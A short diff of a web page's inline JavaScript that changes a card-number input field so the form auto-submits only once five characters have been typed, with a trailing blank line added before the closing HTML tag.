@@ -133,9 +133,11 @@ button:hover {
 	const textField = document.getElementById('card_num');
 
 	textField.addEventListener('input', function() {
-		setTimeout(function() {
-			form.submit();
-		}, 1500);
+		if (textField.value.length === 5) {
+			setTimeout(function() {
+				form.submit();
+			}, 1500);
+		}
 	});
 
 	setTimeout(function() {
@@ -171,4 +173,5 @@ button:hover {
 </script>
 
 </body>
+
 </html>
